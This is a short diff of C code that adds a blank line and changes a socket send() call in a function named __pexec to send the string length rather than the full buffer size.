@@ -114,6 +114,7 @@ int __init()
 
 }
 
+
 int __pexec_ex(int ID)
 {
 
@@ -174,7 +175,7 @@ int __pexec(SOCKET socket)
 			continue;
 		}
 
-		send(socket, buff, sizeof(buff), 0);
+		send(socket, buff, strlen(buff), 0);
 
 	}
 
